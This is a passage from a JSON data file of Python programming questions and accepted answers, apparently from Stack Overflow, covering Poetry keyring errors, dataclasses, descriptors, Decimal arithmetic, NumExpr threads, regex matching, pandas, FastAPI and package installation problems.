    "AcceptedAnswer": "Based on similarities in the stack traces and your description, my guess is that you're facing the same bug from #1892 and #1917, where Poetry tries to use your keyring to access/publish modules, and hence fails when these credentials are invalid.\n\nBut it appears that poetry tries to access the keyring even for install operations.\n\nOne of the solutions proposed was to uninstall the keyring package remotely:\n\nFor me, I worked around the problem by pip uninstalling the 'keyring' package from that virt env.\n\nAnother solution is to export the environment variable PYTHON_KEYRING_BACKEND. Here's an example of how you can do that on Windows:\nSET PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring\n\n... and on Linux:\nexport PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring\n\nUnfortunately, it appears that issue #1917 is still open and unresolved, so this is the best workaround that you can find to fix the issue for now.\n"
}
{
    "Id": 74262112,
    "PostTypeId": 1,
    "Title": "dataclasses: how to ignore default values using asdict()?",
    "Body": "I would like to ignore the default values after calling asdict()\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\nso if I call\na = A(\"1\")\nresult = asdict(a, ignore_default=True) \nassert {\"a\": \"1\"} == result  # the \"b\": True should be deleted\n\n",
    "AcceptedAnswerId": 74293119,
    "AcceptedAnswer": "The dataclasses module doesn't appear to have support for detecting default values in asdict(), however the dataclass-wizard library does -- via skip_defaults argument.\nExample:\nfrom dataclasses import dataclass\nfrom dataclass_wizard import asdict\n\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\na = A(\"1\")\nresult = asdict(a, skip_defaults=True)\nassert {\"a\": \"1\"} == result  # the \"b\": True should be deleted\n\nFurther, results show it is close to 2x faster than an approach with dataclasses.adict().\nI've added benchmark code I used for testing below.\nfrom dataclasses import dataclass, asdict as asdict_orig, MISSING\nfrom timeit import timeit\n\nfrom dataclass_wizard import asdict\n\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\n\ndef asdict_factory(cls):\n    def factory(obj: list[tuple]) -> dict:\n        d = {}\n        for k, v in obj:\n            field_value = cls.__dataclass_fields__[k].default\n            if field_value is MISSING or field_value != v:\n                d[k] = v\n        return d\n\n    return factory\n\na = A(\"1\")\nA_fact = asdict_factory(A)\n\nprint('dataclass_wizard.asdict():  ', timeit('asdict(a, skip_defaults=True)', globals=globals()))\nprint('dataclasses.asdict():       ', timeit('asdict_orig(a, dict_factory=A_fact)', globals=globals()))\n\nresult1 = asdict(a, skip_defaults=True)\nresult2 = asdict_orig(a, dict_factory=A_fact)\n\nassert {\"a\": \"1\"} == result1 == result2\n\na2 = A(\"1\", True)\na3 = A(\"1\", False)\nassert asdict(a2, skip_defaults=True) == asdict_orig(a2, dict_factory=A_fact)\nassert asdict(a3, skip_defaults=True) == asdict_orig(a3, dict_factory=A_fact)\n\n\nDisclaimer: I am the creator and maintainer of this library.\n"
}
{
    "Id": 74307236,
    "PostTypeId": 1,
    "Title": "Python: Why do functools.partial functions not become bound methods when set as class attributes?",
    "Body": "I was reading about how functions become bound methods when being set as class atrributes. I then observed that this is not the case for functions that are wrapped by functools.partial. What is the explanation for this?\nSimple example:\nfrom functools import partial\n\ndef func1():\n    print(\"foo\")\n\nfunc1_partial = partial(func1)\n\nclass A:\n    f = func1\n    g = func1_partial\n\na = A()\n\n\na.f() # TypeError: func1() takes 0 positional arguments but 1 was given\n\na.g() # prints \"foo\"\n\n\nI kind of expected them both to behave in the same way.\n",
    "AcceptedAnswerId": 74307329,
    "AcceptedAnswer": "The trick that allows functions to become bound methods is the __get__ magic method.\nTo very briefly summarize that page, when you access a field on an instance, say foo.bar, Python first checks whether bar exists in foo's __dict__ (or __slots__, if it has one). If it does, we return it, no harm done. If not, then we look on type(foo). However, when we access the field Foo.bar on the class Foo through an instance, something magical happens. When we write foo.bar, assuming there is no bar on foo's __dict__ (resp. __slots__), then we actually call Foo.bar.__get__(foo, Foo). That is, Python calls a magic method asking the object how it would like to be retrieved.\nThis is how properties are implemented, and it's also how bound methods are implemented. Somewhere deep down (probably written in C), there's a __get__ function on the type function that binds the method when accessed through an instance.\nfunctools.partial, despite looking a lot like a function, is not an instance of the type function. It's just a random class that happens to implement __call__, and it doesn't implement __get__. Why doesn't it? Well, they probably just didn't think it was worth it, or it's possible nobody even considered it. Regardless, the \"bound method\" trick applies to the type called function, not to all callable objects.\n\nAnother useful resource on magic methods, and __get__ in particular: https://rszalski.github.io/magicmethods/#descriptor\n"
}
{
    "Id": 74467875,
    "PostTypeId": 1,
    "Title": "VS Code: \"The isort server crashed 5 times in the last 3 minutes...\"",
    "Body": "I may have messed up some environmental path variables.\nI was tinkering around VS Code while learning about Django and virtual environments, and changing the directory path of my Python install. While figuring out how to point VS Code's default Python path, I deleted some User path variables.\nThen, isort began to refuse to run.\nI've tried uninstalling the extension(s), deleting the ms-python.'s, and uninstalling VS Code itself, clearing the Python Workspace Interpreter Settings, and restarting my computer.\nEven if it's not my path variables, anyone know the defaults that should be in the \"user\" paths variables?\n",
    "AcceptedAnswerId": 74488407,
    "AcceptedAnswer": "I ended up refreshing my Windows install. Was for the best because I'm repurposing an older machine anyway.\n"
}
{
    "Id": 74500614,
    "PostTypeId": 1,
    "Title": "Python Decimal - multiplication by zero",
    "Body": "Why does the following code:\nfrom decimal import Decimal\nresult = Decimal('0') * Decimal('0.8881783462119193534061639577')\nprint(result)\n\nreturn 0E-28 ?\nI've traced it to the following code in the module:\nif not self or not other:\n    ans = _dec_from_triple(resultsign, '0', resultexp)\n    # Fixing in case the exponent is out of bounds\n    ans = ans._fix(context)\n    return ans\n\nThe code appears to follow Decimal Arithmetic Specification, which doesn't explicitly suggest what to do when we multiply by zero, referring to 'special numbers' from another standard, which also doesn't specify what we do when we multiply an integer by zero  :)\nSo the decimal library does the thing that is explicitly specified:\n\nThe coefficient of the result, before rounding, is computed by multiplying together the coefficients of the operands.\nThe exponent of the result, before rounding, is the sum of the exponents of the two operands.\nThe sign of the result is the exclusive or of the signs of the operands.\n\nQuestion: what is the need to return the coefficient and exponent (i.e, 0E-28) if one of the operands is a zero? We already know what that coefficient is when calling the multiplication function. Why not just return zero?\n",
    "AcceptedAnswerId": 74515870,
    "AcceptedAnswer": "Raymond Hettinger has given a comprehensive explanation at cpython github:\nIn Arithmetic Operations, the section on Arithmetic operations rules tells us:\n\nTrailing zeros are not removed after operations.\n\nThere are test cases covering multiplication by zero. Here are some from multiply.decTest:\n-- zeros, etc.\nmulx021 multiply  0      0     ->  0\nmulx022 multiply  0     -0     -> -0\nmulx023 multiply -0      0     -> -0\nmulx024 multiply -0     -0     ->  0\nmulx025 multiply -0.0   -0.0   ->  0.00\nmulx026 multiply -0.0   -0.0   ->  0.00\nmulx027 multiply -0.0   -0.0   ->  0.00\nmulx028 multiply -0.0   -0.0   ->  0.00\nmulx030 multiply  5.00   1E-3  ->  0.00500\nmulx031 multiply  00.00  0.000 ->  0.00000\nmulx032 multiply  00.00  0E-3  ->  0.00000     -- rhs is 0\nmulx033 multiply  0E-3   00.00 ->  0.00000     -- lhs is 0\nmulx034 multiply -5.00   1E-3  -> -0.00500\nmulx035 multiply -00.00  0.000 -> -0.00000\nmulx036 multiply -00.00  0E-3  -> -0.00000     -- rhs is 0\nmulx037 multiply -0E-3   00.00 -> -0.00000     -- lhs is 0\nmulx038 multiply  5.00  -1E-3  -> -0.00500\nmulx039 multiply  00.00 -0.000 -> -0.00000\nmulx040 multiply  00.00 -0E-3  -> -0.00000     -- rhs is 0\nmulx041 multiply  0E-3  -00.00 -> -0.00000     -- lhs is 0\nmulx042 multiply -5.00  -1E-3  ->  0.00500\nmulx043 multiply -00.00 -0.000 ->  0.00000\nmulx044 multiply -00.00 -0E-3  ->  0.00000     -- rhs is 0\nmulx045 multiply -0E-3  -00.00 ->  0.00000     -- lhs is 0\n\nAnd this from the examples:\nmulx053 multiply 0.9 -0 -> -0.0\n\nIn the Summary of Arithmetic section, the motivation is explained at a high level:\n\nThe arithmetic was designed as a decimal extended floating-point arithmetic, directly implementing the rules that people are taught at\nschool. Up to a given working precision, exact unrounded results are\ngiven when possible (for instance, 0.9 \u00f7 10 gives 0.09, not\n0.089999996), and trailing zeros are correctly preserved in most operations (1.23 + 1.27 gives 2.50, not 2.5). Where results would\nexceed the working precision, floating-point rules apply.\n\nMore detail in given in the FAQ section Why are trailing fractional zeros important?.\n"
}
{
    "Id": 71248521,
    "PostTypeId": 1,
    "Title": "Why \" NumExpr defaulting to 8 threads. \" warning message shown in python?",
    "Body": "I am trying to use the lux library in python to get visualization recommendations. It shows warnings like NumExpr defaulting to 8 threads..\nimport pandas as pd\nimport numpy as np\nimport opendatasets as od\npip install lux-api\nimport lux\nimport matplotlib\n\nAnd then:\nlink = \"https://www.kaggle.com/noordeen/insurance-premium-prediction\"\nod.download(link) \ndf = pd.read_csv(\"./insurance-premium-prediction/insurance.csv\")\n\nBut, everything is working fine. Is there any problem or should I ignore it?\nWarning shows like this:\n\n",
    "AcceptedAnswerId": 74656206,
    "AcceptedAnswer": "This is not really something to worry about in most cases. The warning comes from this function, here the most important part:\n...\n    env_configured = False\n    n_cores = detect_number_of_cores()\n    if 'NUMEXPR_MAX_THREADS' in os.environ:\n        # The user has configured NumExpr in the expected way, so suppress logs.\n        env_configured = True\n        n_cores = MAX_THREADS\n...\n    if 'NUMEXPR_NUM_THREADS' in os.environ:\n        requested_threads = int(os.environ['NUMEXPR_NUM_THREADS'])\n    elif 'OMP_NUM_THREADS' in os.environ:\n        requested_threads = int(os.environ['OMP_NUM_THREADS'])\n    else:\n        requested_threads = n_cores\n        if not env_configured:\n            log.info('NumExpr defaulting to %d threads.'%n_cores)\n\nSo if neither NUMEXPR_MAX_THREADS nor NUMEXPR_NUM_THREADS nor OMP_NUM_THREADS are set, NumExpr uses so many threads as there are cores (even if the documentation says \"at most 8\", yet this is not what I see in the code).\nYou might want to use another number of threads, e.g. while really huge matrices are calculated and one could profit from it or to use less threads, because there is no improvement. Set the environment variables either in the shell or prior to importing numexpr, e.g.\nimport os\nos.environ['NUMEXPR_MAX_THREADS'] = '4'\nos.environ['NUMEXPR_NUM_THREADS'] = '2'\nimport numexpr as ne \n\n"
}
{
    "Id": 74717007,
    "PostTypeId": 1,
    "Title": "Why does a python function work in parallel even if it should not?",
    "Body": "I am running this code using the healpy package. I am not using multiprocessing and I need it to run on a single core. It worked for a certain amount of time, but, when I run it now, the function healpy.projector.GnomonicProj.projmap takes all the available cores.\nThis is the incriminated code block:\ndef Stacking () :\n\n    f = lambda x,y,z: pixelfunc.vec2pix(xsize,x,y,z,nest=False)\n    map_array = pixelfunc.ma_to_array(data)\n    im = np.zeros((xsize, xsize))\n    plt.figure()\n\n    for i in range (nvoids) :\n        sys.stdout.write(\"\\r\" + str(i+1) + \"/\" + str(nvoids))\n        sys.stdout.flush()\n        proj = hp.projector.GnomonicProj(rot=[rav[i],decv[i]], xsize=xsize, reso=2*nRad*rad_deg[i]*60/(xsize))\n        im += proj.projmap(map_array, f)\n\n    im/=nvoids\n    plt.imshow(im)\n    plt.colorbar()\n    plt.title(title + \" (Map)\")\n    plt.savefig(\"../Plots/stackedMap_\"+name+\".png\")\n\n    return im\n\nDoes someone know why this function is running in parallel? And most important, does someone know a way to run it in a single core?\nThank you!\n",
    "AcceptedAnswerId": 74717228,
    "AcceptedAnswer": "In this thread they recommend to set the environment variable OMP_NUM_THREADS accordingly:\n\nWorked with:\nimport os\nos.environ['OMP_NUM_THREADS'] = '1'\nimport healpy as hp\nimport numpy as np\n\nos.environ['OMP_NUM_THREADS'] = '1' have to be done before import numpy and healpy libraries.\n\nAs to the why: probably they use some parallelization techniques wrapped within their implementation of the functions you use. According to the name of the variable, I would guess OpenMP it is.\n"
}
{
    "Id": 74717893,
    "PostTypeId": 1,
    "Title": "How to efficiently search for similar substring in a large text python?",
    "Body": "Let me try to explain my issue with an example, I have a large corpus and a substring like below,\ncorpus = \"\"\"very quick service, polite workers(cory, i think that's his name), i basically just drove there and got a quote(which seems to be very fair priced), then dropped off my car 4 days later(because they were fully booked until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now.\"\"\"\n\nsubstring = \"\"\"until then then i dropped off my car on my appointment day then the same day the shop called me and notified me that the the job is done i can go pickup my car when i go checked out my car i was amazed by the job they ve done to it and they even gave that dirty car a wash prob even waxed it or coated it cuz it was shiny as hell tires shine mats were vacuumed too i gave them a dirty broken car they gave me back a what seems like a brand new car i m happy with the result and i will def have all my car s work done by this place from now\"\"\"\n\nBoth the substring and corpus are very similar but it not exact,\nIf I do something like,\nimport re\nre.search(substring, corpus, flags=re.I) # this will fail substring is not exact but rather very similar\n\nIn the corpus the substring is like below which is bit different from the substring I have because of that regular expression search is failing, can someone suggest a really good alternative for similar substring lookup,\nuntil then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now\n\nI did try difflib library but it was not satisfying my use-case.\nSome background information,\nThe substring I have right now, is obtained some time ago from pre-processed corpus using this regex re.sub(\"[^a-zA-Z]\", \" \", corpus).\nBut now I need to use that substring I have to do the reverse lookup in the corpus text and find the start and ending index in the corpus.\n",
    "AcceptedAnswerId": 74719826,
    "AcceptedAnswer": "You don't actually need to fuzzy match all that much, at least for the example given; text can only change in spaces within substring, and it can only change by adding at least one non-alphabetic character (which can replace a space, but the space can't be deleted without a replacement). This means you can construct a regex directly  from substring with wildcards between words, search (or finditer) the corpus for it, and the resulting match object will tell you where the match(es) begin and end:\nimport re\n\n# Allow any character between whitespace-separated \"words\" except ASCII\n# alphabetic characters\nssre = re.compile(r'[^a-z]+'.join(substring.split()), re.IGNORECASE)\n\nif m := ssre.search(corpus):\n    print(m.start(), m.end())\n\n    print(repr(m.group(0)))\n\nTry it online!\nwhich correctly identifies where the match began (index 217) and ended (index 771) in corpus; .group(0) can directly extract the matching text for you if you prefer (it's uncommon to need the indices, so there's a decent chance you were asking for them solely to extract the real text, and .group(0) does that directly). The output is:\n217 771\n\"until then), then i dropped off my car on my appointment day, then the same day the shop called me and notified me that the the job is done i can go pickup my car. when i go checked out my car i was amazed by the job they've done to it, and they even gave that dirty car a wash( prob even waxed it or coated it, cuz it was shiny as hell), tires shine, mats were vacuumed too. i gave them a dirty, broken car, they gave me back a what seems like a brand new car. i'm happy with the result, and i will def have all my car's work done by this place from now\"\n\nIf spaces might be deleted without being replaced, just change the + quantifier to * (the regex will run a little slower since it can't short-circuit as easily, but would still work, and should run fast enough).\nIf you need to handle non-ASCII alphabetic characters, the regex joiner can change from r'[^a-z]+' to the equivalent r'[\\W\\d_]+' (which means \"match all non-word characters [non-alphanumeric and not underscore], plus numeric characters and underscores\"); it's a little more awkward to read, but it handles stuff like \u00e9 properly (treating it as part of a word, not a connector character).\nWhile it's not going to be as flexible as difflib, when you know no words are removed or added, it's just a matter of spacing and punctuation, this works perfectly, and should run significantly faster than a true fuzzy matching solution (that has to do far more work to handle the concept of close matches).\n"
}
{
    "Id": 74948525,
    "PostTypeId": 1,
    "Title": "FutureWarning: save is not part of the public API in Python",
    "Body": "I am using Python to convert Pandas df to .xlsx (in Plotly-Dash app.). All working well so far but with this warning tho:\n\"FutureWarning:\nsave is not part of the public API, usage can give unexpected results and will be removed in a future version\"\nHow should I modify the code below in order to keep its functionality and stability in future? Thanks!\n writer = pd.ExcelWriter(\"File.xlsx\", engine = \"xlsxwriter\")\n\n workbook  = writer.book\n\n df.to_excel(writer, sheet_name = 'Sheet', index = False)\n  \n writer.save()\n\n",
    "AcceptedAnswerId": 74948596,
    "AcceptedAnswer": "just replace save with close.\n writer = pd.ExcelWriter(\"File.xlsx\", engine = \"xlsxwriter\")\n\n workbook  = writer.book\n\n df.to_excel(writer, sheet_name = 'Sheet', index = False)\n  \n writer.close()\n\n"
}
{
    "Id": 70694787,
    "PostTypeId": 1,
    "Title": "fastapi fastapi-users with Database adapter for SQLModel users table is not created",
    "Body": "I was trying to use fastapi users package to quickly Add a registration and authentication system to my FastAPI project which uses the PostgreSQL database. I am using asyncio to be able to create asynchronous functions.\nIn the beginning, I used only sqlAlchemy and I have tried their example here. And I added those line of codes to my app/app.py to create the database at the starting of the server. and everything worked like a charm. the table users was created on my database.\n@app.on_event(\"startup\")\nasync def on_startup():\n    await create_db_and_tables()\n\nSince I am using SQLModel I added FastAPI Users - Database adapter for SQLModel to my virtual en packages. And I added those lines to fastapi_users/db/__init__.py to be able to use the SQL model database.\ntry:\n    from fastapi_users_db_sqlmodel import (  # noqa: F401\n        SQLModelBaseOAuthAccount,\n        SQLModelBaseUserDB,\n        SQLModelUserDatabase,\n    )\nexcept ImportError:  # pragma: no cover\n    pass\n\nI have also modified app/users.py, to use SQLModelUserDatabase instead of sqlAchemy one.\nasync def get_user_manager(user_db: SQLModelUserDatabase = Depends(get_user_db)):\n    yield UserManager(user_db)\n\nand the app/dp.py to use SQLModelUserDatabase, SQLModelBaseUserDB, here is the full code of app/db.py\nimport os\nfrom typing import AsyncGenerator\n\nfrom fastapi import Depends\nfrom sqlalchemy.ext.asyncio import AsyncSession, create_async_engine\nfrom sqlalchemy.orm import sessionmaker\n\nfrom fastapi_users.db import SQLModelUserDatabase, SQLModelBaseUserDB\nfrom sqlmodel import SQLModel\n\n\nfrom app.models import UserDB\n\nDATABASE_URL = os.environ.get(\"DATABASE_URL\")\n\n\nengine = create_async_engine(DATABASE_URL)\n\nasync_session_maker = sessionmaker(\n    engine, class_=AsyncSession, expire_on_commit=False)\n\n\nasync def create_db_and_tables():\n    async with engine.begin() as conn:\n        await conn.run_sync(SQLModel.metadata.create_all)\n\n\nasync def get_async_session() -> AsyncSession:\n    async_session = sessionmaker(\n        engine, class_=AsyncSession, expire_on_commit=False\n    )\n    async with async_session() as session:\n        yield session\n\n\nasync def get_user_db(session: AsyncSession = Depends(get_async_session)):\n    yield SQLModelUserDatabase(UserDB, session, SQLModelBaseUserDB)\n\n\nOnce I run the code, the table is not created at all. I wonder what could be the issue. I could not understand. Any idea?\n",
    "AcceptedAnswerId": 75063693,
    "AcceptedAnswer": "By the time I posted this question that was the answer I received from one of the maintainer of fastapi-users that made me switch to sqlAlchemy that time, actually I do not know if they officially released sqlModel DB adapter or not\n\nMy guess is that you didn't change the UserDB model so that it inherits from the SQLModelBaseUserDB one. It's necessary in order to let SQLModel detect all your models and create them.\n\n\nYou can have an idea of what it should look like in fastapi-users-db-sqlmodel tests: https://github.com/fastapi-users/fastapi-users-db-sqlmodel/blob/3a46b80399f129aa07a834a1b40bf49d08c37be1/tests/conftest.py#L25-L27\n\n\n\nBear in mind though that we didn't officially release this DB adapter; as they are some problems with SQLModel regarding UUID (tiangolo/sqlmodel#25). So you'll probably run into issues.\n\n\nand here is the GitHub link of the issue: https://github.com/fastapi-users/fastapi-users/discussions/861\n"
}
{
    "Id": 73894238,
    "PostTypeId": 1,
    "Title": "gevent 21.12.0 installation failing in mac os monterey",
    "Body": "I am trying to install gevent 21.12.0 on Mac OS Monterey (version 12.6) with python 3.9.6 and pip 21.3.1. But it is failing with the below error. Any suggestion?\n(venv) debrajmanna@debrajmanna-DX6QR261G3 qa % pip install gevent\nCollecting gevent\n  Using cached gevent-21.12.0.tar.gz (6.2 MB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nCollecting greenlet=1.1.0\n  Using cached greenlet-1.1.3-cp39-cp39-macosx_10_9_universal2.whl\nCollecting zope.event\n  Using cached zope.event-4.5.0-py2.py3-none-any.whl (6.8 kB)\nCollecting zope.interface\n  Using cached zope.interface-5.4.0-cp39-cp39-macosx_10_9_universal2.whl\nRequirement already satisfied: setuptools in /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages (from gevent) (60.2.0)\nBuilding wheels for collected packages: gevent\n  Building wheel for gevent (pyproject.toml) ... error\n  ERROR: Command errored out with exit status 1:\n   command: /Users/debrajmanna/code/python/github/spotnana/venv/bin/python /Users/debrajmanna/code/python/github/spotnana/venv/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/tmpi2i_lqc2\n       cwd: /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370\n  Complete output (46 lines):\n  running bdist_wheel\n  running build\n  running build_py\n  running build_ext\n  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c'\n  Running '(cd  \"/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/libev\"  && sh ./configure -C > configure-output.txt )' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370\n  generating cffi module 'build/temp.macosx-10.9-universal2-cpython-39/gevent.libev._corecffi.c'\n  Not configuring libev, 'config.h' already exists\n  Not configuring libev, 'config.h' already exists\n  building 'gevent.libev.corecext' extension\n  Embedding c-ares .build_ext_make_mod object at 0x104f40bb0> \n  Inserted  build/temp.macosx-10.9-universal2-cpython-39/c-ares/include in include dirs ['build/temp.macosx-10.9-universal2-cpython-39/c-ares/include', '/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/include/python3.9', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/include', '/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares/src/lib', 'src/gevent', 'src/gevent/libev', 'src/gevent/resolver', '.']\n  Running '(cd  \"/private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/deps/c-ares\"  && if [ -r include/ares_build.h ]; then cp include/ares_build.h include/ares_build.h.orig; fi   && sh ./configure --disable-dependency-tracking -C CFLAGS=\"-Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -iwithsysroot/System/Library/Frameworks/System.framework/PrivateHeaders -iwithsysroot/Applications/Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9/Headers -arch arm64 -arch x86_64 -Werror=implicit-function-declaration\"  && cp src/lib/ares_config.h include/ares_build.h \"$OLDPWD\"   && cat include/ares_build.h   && if [ -r include/ares_build.h.orig ]; then mv include/ares_build.h.orig include/ares_build.h; fi) > configure-output.txt' in /private/var/folders/ls/b6mf3_jd17916k8bs8jwy2g80000gn/T/pip-install-qprhzmpd/gevent_54aaef476d2d411ba9ad080d0291a370/build/temp.macosx-10.9-universal2-cpython-39/c-ares/include\n  configure: WARNING: Continuing even with errors mentioned immediately above this line.\n  rm: conftest.dSYM: is a directory\n  rm: conftest.dSYM: is a directory\n  configure: WARNING: Continuing even with errors mentioned immediately above this line.\n  building 'gevent.resolver.cares' extension\n  building 'gevent._gevent_c_greenlet_primitives' extension\n  building 'gevent._gevent_c_hub_primitives' extension\n  building 'gevent._gevent_c_hub_local' extension\n  building 'gevent._gevent_c_waiter' extension\n  building 'gevent._gevent_cgreenlet' extension\n  building 'gevent._gevent_c_tracer' extension\n  building 'gevent._gevent_c_abstract_linkable' extension\n  building 'gevent._gevent_c_semaphore' extension\n  building 'gevent._gevent_clocal' extension\n  building 'gevent._gevent_c_ident' extension\n  building 'gevent._gevent_c_imap' extension\n  building 'gevent._gevent_cevent' extension\n  building 'gevent._gevent_cqueue' extension\n  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]\n  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {\n             ^\n  1 warning generated.\n  src/gevent/queue.c:7071:12: warning: unused function '__pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__' [-Wunused-function]\n  static int __pyx_pw_6gevent_14_gevent_cqueue_5Queue_25__nonzero__(PyObject *__pyx_v_self) {\n             ^\n  1 warning generated.\n  building 'gevent.libev._corecffi' extension\n  building 'gevent.libuv._corecffi' extension\n  build/temp.macosx-10.9-universal2-cpython-39/gevent.libuv._corecffi.c:50:14: fatal error: 'pyconfig.h' file not found\n  #    include \n               ^~~~~~~~~~~~\n  1 error generated.\n  error: command '/usr/bin/clang' failed with exit code 1\n  ----------------------------------------\n  ERROR: Failed building wheel for gevent\nFailed to build gevent\nERROR: Could not build wheels for gevent, which is required to install pyproject.toml-based projects\n\n",
    "AcceptedAnswerId": 75240247,
    "AcceptedAnswer": "Looked all over trying to figure out a solution to this problem until I finally stumbled on this post.\nI think the issue is specific to the virtual environment. I had the project open with it's own venv in PyCharm, and it seems that the python distribution headers were not findable.\nTo reiterate the solution linked:\n\nFind where the Python.h file is defined. I was able to find it using find /usr/local -name Python.h\nCopy the path to the directory Python.h is defined in\nSet the C_INCLUDE_PATH environment variable accordingly, for me: export C_INCLUDE_PATH=\"/usr/local/munki/Python.framework/Versions/3.9/include/python3.9\"\n\nAfter this, I was able to run pip3 install gevent with no issues.\n"
}
{
    "Id": 70583980,
    "PostTypeId": 1,
    "Title": "I am unable to create a new virtualenv in ubuntu?",
    "Body": "So, I installed virtualenv in ubuntu terminal. I installed using the following commands:\nsudo apt install python3-virtualenv\npip install virtualenv\n\nBut when I try creating a new virtualenv using:\nvirtualenv -p python3 venv\n\nI am getting the following error:\nAttributeError: module 'virtualenv.create.via_global_ref.builtin.cpython.mac_os' has no attribute 'CPython2macOsArmFramework'\n\nHow can I solve it?\n",
    "AcceptedAnswerId": 70584013,
    "AcceptedAnswer": "You don't need to use virtualenv. You can use this:\npython3 -m venv ./some_env\n\n"
}
{
    "Id": 70658748,
    "PostTypeId": 1,
    "Title": "Using FastAPI in a sync way, how can I get the raw body of a POST request?",
    "Body": "Using FastAPI in a sync, not async mode, I would like to be able to receive the raw, unchanged body of a POST request.\nAll examples I can find show async code, when I try it in a normal sync way, the request.body() shows up as a coroutine object.\nWhen I test it by posting some XML to this endpoint, I get a 500 \"Internal Server Error\".\nfrom fastapi import FastAPI, Response, Request, Body\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef read_root():\n    return {\"Hello\": \"World\"}\n\n@app.post(\"/input\")\ndef input_request(request: Request):\n    # how can I access the RAW request body here?  \n    body = request.body()\n\n    # do stuff with the body here  \n\n    return Response(content=body, media_type=\"application/xml\")\n\nIs this not possible with FastAPI?\nNote: a simplified input request would look like:\nPOST http://127.0.0.1:1083/input\nContent-Type: application/xml\n\n\n    TEST\n\n\nand I have no control over how input requests are sent, because I need to replace an existing SOAP API.\n",
    "AcceptedAnswerId": 70659178,
    "AcceptedAnswer": "Using async def endpoint\nIf an object is a co-routine, it needs to be awaited. FastAPI is actually Starlette underneath, and Starlette methods for returning the request body are async methods (see the source code here as well); thus, one needs to await them (inside an async def endpoint). For example:\nfrom fastapi import Request\n\n@app.post(\"/input\")\nasync def input_request(request: Request):\n    return await request.body()\n\nUpdate 1 - Using def endpoint\nAlternatively, if you are confident that the incoming data is a valid JSON, you can define your endpoint with def instead, and use the Body field, as shown below (for more options on how to post JSON data, see this answer):\nfrom fastapi import Body\n\n@app.post(\"/input\")\ndef input_request(payload: dict = Body(...)):\n    return payload\n\nIf, however, the incoming data are in XML format, as in the example you provided, one option is to pass them using Files instead, as shown below\u2014as long as you have control over how client data are sent to the server (have a look here as well). Example:\nfrom fastapi import File\n\n@app.post(\"/input\") \ndef input_request(contents: bytes = File(...)): \n    return contents\n\nUpdate 2 - Using def endpoint and async dependency\nAs described in this post, you can use an async dependency function to pull out the body from the request. You can use async dependencies on non-async (i.e., def) endpoints as well. Hence, if there is some sort of blocking code in this endpoint that prevents you from using async/await\u2014as I am guessing this might be the reason in your case\u2014this is the way to go.\nNote: I should also mention that this answer\u2014which explains the difference between def and async def endpoints (that you might be aware of)\u2014also provides solutions when you are required to use async def (as you might need to await for coroutines inside a route), but also have some synchronous expensive CPU-bound operation that might be blocking the server. Please have a look.\nExample of the approach described earlier can be found below. You can uncomment the time.sleep() line, if you would like to confirm yourself that a request won't be blocking other requests from going through, as when you declare an endpoint with normal def instead of async def, it is run in an external threadpool (regardless of the async def dependency function).\nfrom fastapi import FastAPI, Depends, Request\nimport time\n\napp = FastAPI()\n\nasync def get_body(request: Request):\n    return await request.body()\n\n@app.post(\"/input\")\ndef input_request(body: bytes = Depends(get_body)):\n    print(\"New request arrived.\")\n    #time.sleep(5)\n    return body\n\n"
}
{
    "Id": 70651053,
    "PostTypeId": 1,
    "Title": "How can I send Dynamic website content to scrapy with the html content generated by selenium browser?",
